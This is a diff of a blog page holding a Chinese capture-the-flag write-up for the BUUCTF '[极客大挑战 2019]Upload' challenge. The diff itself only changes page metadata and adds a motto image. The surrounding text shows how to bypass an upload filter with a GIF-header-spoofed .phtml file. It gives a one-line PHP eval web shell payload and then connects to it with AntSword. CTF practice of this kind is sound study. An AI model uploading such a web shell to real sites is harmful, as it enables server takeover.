@@ -93,13 +93,14 @@
 
 
 
-<meta name="description" content="前言周末随便刷点小题 [极客大挑战 2019]Upload本关我们构造jpg文件传入一句话木马的话，&lt;会被识别出来而无法上传我们尝试构造pthml文件，pthml文件指的是嵌入html的php文件，这里我们可以发现仍然不行，可能对文件头进行了检查那我们这里呢，就构造pthml文件，这样标签就不会被过滤，也就可以绕过构造payload如下GIF89A&lt;script language&#x3D;&amp;q">
+<meta name="description" content="在没有什么波澜的生活里也要自己创造快乐">
 <meta property="og:type" content="article">
 <meta property="og:title" content="buuctf一天小练习">
 <meta property="og:url" content="https://quan9i.top/buuctf2/index.html">
 <meta property="og:site_name" content="quan9i&#39;s blog">
-<meta property="og:description" content="前言周末随便刷点小题 [极客大挑战 2019]Upload本关我们构造jpg文件传入一句话木马的话，&lt;会被识别出来而无法上传我们尝试构造pthml文件，pthml文件指的是嵌入html的php文件，这里我们可以发现仍然不行，可能对文件头进行了检查那我们这里呢，就构造pthml文件，这样标签就不会被过滤，也就可以绕过构造payload如下GIF89A&lt;script language&#x3D;&amp;q">
+<meta property="og:description" content="在没有什么波澜的生活里也要自己创造快乐">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/cfedb5bc67e5430aa8c33c811de91ad6.png">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/5bcc8293017d4c2984dc21ed3212d7aa.png">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/3ac627ba18634efdb45c7657c79b0133.png">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/ddc7cbed01684b8db08d78c2675bd148.png">
@@ -124,11 +125,11 @@
 <meta property="og:image" content="https://img-blog.csdnimg.cn/7704a6834d6f412f87e95fd1780d6046.png">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/f9c8b2844e0e47caa8941a1412297ed3.png">
 <meta property="article:published_time" content="2022-04-10T15:35:03.539Z">
-<meta property="article:modified_time" content="2022-04-10T15:47:58.544Z">
+<meta property="article:modified_time" content="2022-04-10T15:56:53.541Z">
 <meta property="article:author" content="quan9i">
 <meta property="article:tag" content="刷题">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/5bcc8293017d4c2984dc21ed3212d7aa.png">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/cfedb5bc67e5430aa8c33c811de91ad6.png">
 
 
 
@@ -487,7 +488,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1.2k
+                  1.3k
                 </span>
               
 
@@ -524,7 +525,9 @@
       
 
       
-        <h1><span id="前言">前言</span></h1><p>周末随便刷点小题</p>
+        <p><img src="https://img-blog.csdnimg.cn/cfedb5bc67e5430aa8c33c811de91ad6.png" alt="在这里插入图片描述"><br>在没有什么波澜的生活里也要自己创造快乐</p>
+<span id="more"></span>
+<h1><span id="前言">前言</span></h1><p>周末随便刷点小题</p>
 <h1><span id="极客大挑战-2019upload">[极客大挑战 2019]Upload</span></h1><p>本关我们构造<code>jpg</code>文件传入一句话木马的话，<code>&lt;</code>会被识别出来而无法上传<br><img src="https://img-blog.csdnimg.cn/5bcc8293017d4c2984dc21ed3212d7aa.png" alt="在这里插入图片描述"><br>我们尝试构造pthml文件，pthml文件指的是嵌入html的php文件，这里我们可以发现仍然不行，可能对文件头进行了检查<br><img src="https://img-blog.csdnimg.cn/3ac627ba18634efdb45c7657c79b0133.png" alt="在这里插入图片描述"><br>那我们这里呢，就构造pthml文件，这样标签就不会被过滤，也就可以绕过<br>构造payload如下<br><code>GIF89A&lt;script language=&quot;php&quot;&gt;eval($_POST[1]);phpinfo();&lt;/script&gt;</code><br>(GIF89A是构造一个图片头文件欺骗)<br><img src="https://img-blog.csdnimg.cn/ddc7cbed01684b8db08d78c2675bd148.png" alt="在这里插入图片描述"><br>查看这个文件，盲猜文件存放位置为<code>upload</code>下<br><img src="https://img-blog.csdnimg.cn/dc42ced125b24f3798ce9c1a32b30afc.png" alt="在这里插入图片描述"></p>
 <p>此时蚁剑连接获取webshell即可<br><img src="https://img-blog.csdnimg.cn/df64b150532449a9831f758c974f4a98.png" alt="在这里插入图片描述"><br>此时寻找flag即可<br><img src="https://img-blog.csdnimg.cn/68d0ecfe69d34f9c8ae04ff9b783793b.png" alt="在这里插入图片描述"></p>
 <p>其实我本来的思路是想试试%00截断的，但是这里一是不知道PHP版本是否符合要求，二是后端过滤了&lt;，所以我们这个思路不可行，学习其他大师傅的思路后才知道用phtml绕过即可</p>
